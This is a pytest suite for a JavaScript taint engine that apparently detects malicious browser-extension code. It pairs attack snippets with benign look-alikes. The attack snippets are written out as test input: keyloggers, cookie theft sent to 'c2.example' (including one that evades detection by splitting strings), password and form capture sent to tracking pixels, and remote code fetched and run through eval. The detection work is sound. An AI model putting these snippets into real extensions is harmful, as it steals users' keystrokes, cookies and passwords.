"""Unit tests for the taint engine: each malicious pattern is paired with a
legitimate one that uses the same APIs and must NOT be flagged."""

import pytest

from extsentinel.js.parser import parse
from extsentinel.js.taint import analyze_ast

_BACKEND = ["auto"]


@pytest.fixture(autouse=True)
def _select_backend(backend):
    _BACKEND[0] = backend


def run(src: str):
    result = parse(src, _BACKEND[0])
    assert result.ast is not None, result.error
    return analyze_ast("t.js", result.ast)


def network_labels(fa) -> set[str]:
    return {lab for f in fa.flows if f.sink == "network" for lab in f.labels}


# --- keystrokes -----------------------------------------------------------------


def test_keylogger_buffer_flushed_by_timer():
    fa = run("""
        let buf = '';
        document.addEventListener('keydown', e => { buf += e.key; });
        setInterval(() => { fetch('https://collect.example/k', {method: 'POST', body: buf}); }, 5000);
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_shortcut_handler_is_not_a_keylogger():
    fa = run("""
        document.addEventListener('keydown', e => {
            if (e.key === 'k' && e.ctrlKey) { fetch('https://api.example/telemetry?event=palette'); }
        });
    """)
    assert network_labels(fa) == set()
    assert [l.event for l in fa.listeners] == ["keyboard"]


def test_keystrokes_through_helper_function_and_array():
    fa = run("""
        const log = [];
        function record(k) { log.push(k); }
        window.onkeypress = function (ev) { record(String.fromCharCode(ev.which)); };
        function flush() { const x = new XMLHttpRequest(); x.open('POST', 'https://k.example/'); x.send(JSON.stringify(log)); }
        setTimeout(flush, 1000);
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_destructured_event_parameter():
    fa = run("document.addEventListener('keyup', ({key}) => navigator.sendBeacon('https://b.example', key));")
    assert "KEYSTROKES" in network_labels(fa)


# --- cookies ----------------------------------------------------------------------


def test_cookie_exfiltration_via_callback():
    fa = run("""
        const send = d => navigator.sendBeacon('https://c2.example/x', JSON.stringify(d));
        chrome.cookies.getAll({}, cookies => cookies.forEach(c => send({n: c.name, v: c.value})));
    """)
    flow = next(f for f in fa.flows if "COOKIES" in f.labels)
    assert flow.destination == "https://c2.example/x"


def test_cookie_exfiltration_via_await():
    fa = run("""
        async function go() {
            const all = await chrome.cookies.getAll({});
            await fetch(`https://c2.example/u?d=${btoa(JSON.stringify(all))}`);
        }
        go();
    """)
    assert "COOKIES" in network_labels(fa)
    assert any(f.destination and f.destination.startswith("https://c2.example/u") for f in fa.flows)


def test_cookies_used_locally_are_not_exfiltration():
    fa = run("chrome.cookies.getAll({domain: 'example.com'}, cs => chrome.storage.local.set({count: cs.length}));")
    assert network_labels(fa) == set()
    assert "COOKIES" in fa.sensitive_reads


def test_evasion_split_strings_and_aliases():
    fa = run("""
        var api = chrome, k = 'coo' + 'kies', m = ['get', 'All'].join('');
        api[k][m]({}, x => { var u = '//h.example/?' + encodeURIComponent(JSON.stringify(x)); new Image().src = u; });
    """)
    assert "COOKIES" in network_labels(fa)


# --- forms / passwords --------------------------------------------------------------


def test_password_field_value_to_pixel():
    fa = run("""
        const p = document.querySelector('input[type=password]');
        p.addEventListener('change', () => { const img = new Image(); img.src = 'https://px.example/p?v=' + p.value; });
    """)
    assert "PASSWORD" in network_labels(fa)


def test_form_submit_capture():
    fa = run("""
        document.addEventListener('submit', e => {
            const data = new FormData(e.target);
            fetch('https://forms.example/', {method: 'POST', body: data});
        }, true);
    """)
    assert "FORM_INPUT" in network_labels(fa)


# --- remote code ----------------------------------------------------------------------


def test_remote_code_execution():
    fa = run("fetch('https://cdn.example/p.js').then(r => r.text()).then(code => eval(code));")
    ce = next(c for c in fa.code_execs if c.kind == "eval")
    assert "REMOTE_DATA" in ce.labels


def test_then_eval_directly():
    fa = run("fetch('https://cdn.example/p.js').then(r => r.text()).then(eval);")
    assert any("REMOTE_DATA" in c.labels for c in fa.code_execs)


def test_bundler_global_idiom_is_constant():
    fa = run("var g = Function('return this')();")
    ce = fa.code_execs[0]
    assert ce.const == "return this" and not ce.labels


def test_remote_script_element():
    fa = run("const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s);")
    ce = next(c for c in fa.code_execs if c.kind == "script_src")
    assert ce.const == "https://evil.example/x.js"


def test_bundled_script_injection_is_extension_url():
    fa = run("const s = document.createElement('script'); s.src = chrome.runtime.getURL('inject.js'); document.head.append(s);")
    ce = next(c for c in fa.code_execs if c.kind == "script_src")
    assert ce.is_extension_url


def test_page_message_to_eval_is_untrusted():
    fa = run("window.addEventListener('message', ev => { eval(ev.data.code); });")
    assert any("UNTRUSTED_PAGE" in c.labels for c in fa.code_execs)


# --- modern syntax through the pre-processor --------------------------------------------


def test_optional_chaining_and_nullish():
    fa = run("""
        document.addEventListener('keydown', e => {
            const k = e?.key ?? '';
            fetch('https://k.example/?' + k);
        });
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_class_fields_static_blocks_and_top_level_await():
    fa = run("""
        class Logger {
            buf = '';
            #endpoint = 'https://k.example/collect';
            static instance = new Logger();
            static { document.addEventListener('keydown', e => Logger.instance.add(e.key)); }
            add(k) { this.buf += k; send(k, this.#endpoint); }
        }
        function send(d, u) { fetch(u, {method: 'POST', body: d}); }
        const cfg = await fetch('https://cfg.example').then(r => r.json());
        const re = /\p{L}+/gu;
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_this_state_shared_between_methods():
    fa = run("""
        class Recorder {
            constructor() { this.keys = []; document.addEventListener('keydown', e => this.keys.push(e.key)); }
            flush() { navigator.sendBeacon('https://r.example/', JSON.stringify(this.keys)); }
        }
        const r = new Recorder();
        setInterval(() => r.flush(), 10000);
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_parameter_defaults_are_not_class_fields():
    fa = run("""
        class Sender {
            constructor(url = 'https://s.example/', opts = {}) { this.url = url; }
            send(data, retries = 3) { fetch(this.url, {method: 'POST', body: data}); }
        }
        document.addEventListener('keydown', e => new Sender().send(e.key));
    """)
    assert "KEYSTROKES" in network_labels(fa)


def test_remote_code_through_storage_is_still_caught():
    fa = run("""
        fetch('https://cfg.example/update').then(r => r.text()).then(t => chrome.storage.local.set({payload: t}));
        chrome.storage.local.get('payload', items => { new Function(items.payload)(); });
    """)
    assert any("REMOTE_DATA" in c.labels for c in fa.code_execs)


def test_extension_url_survives_url_building():
    fa = run("""
        const BrowserApi = { getRuntimeURL: p => chrome.runtime.getURL(p) };
        const frame = document.createElement('iframe');
        const u = new URL(BrowserApi.getRuntimeURL('bar.html'));
        u.searchParams.set('origin', location.origin);
        frame.src = u.toString();
    """)
    assert all(f.dest_extension for f in fa.flows if f.sink == "network")


def test_opaque_timer_argument_is_not_code():
    fa = run("function later(cb, ms) { setTimeout(cb, ms); } window.addEventListener('message', e => later(e.data, 10));")
    assert not fa.code_execs


def test_extension_url_through_static_method():
    fa = run("""
        class BrowserApi { static getRuntimeURL(p) { if (BrowserApi.isWebExtensionsApi) { return browser.runtime.getURL(p); } return chrome.runtime.getURL(p); } }
        const u = new URL(BrowserApi.getRuntimeURL('bar.html'));
        u.searchParams.set('parentOrigin', globalThis.location.origin);
        document.createElement('iframe').src = u.toString();
    """)
    assert fa.flows and all(f.dest_extension for f in fa.flows if f.sink == "network")


def test_tree_sitter_recovers_from_a_broken_region():
    if _BACKEND[0] != "tree-sitter":
        pytest.skip("error recovery is a tree-sitter feature")
    filler = "\n".join(f"function helper{i}(a, b) {{ return a + b * {i}; }}" for i in range(30))
    result = parse(filler + """
        let buf = '';
        document.addEventListener('keydown', e => { buf += e.key; });
        function broken( { %%% ;
        setInterval(() => fetch('https://k.example/', {method: 'POST', body: buf}), 1000);
    """, "tree-sitter")
    assert result.ast is not None and result.syntax_errors >= 1
    fa = analyze_ast("t.js", result.ast)
    assert "KEYSTROKES" in network_labels(fa)


def test_decorators_and_modern_syntax_parse_natively():
    if _BACKEND[0] != "tree-sitter":
        pytest.skip("decorators are only supported by tree-sitter")
    fa = run("""
        @component({tag: 'x'})
        class Widget {
            static #instances = 0;
            accessor value = 1;
            onKey = (e) => navigator.sendBeacon('https://w.example/', e?.key ?? '');
        }
        document.addEventListener('keydown', new Widget().onKey);
    """)
    assert "KEYSTROKES" in network_labels(fa)
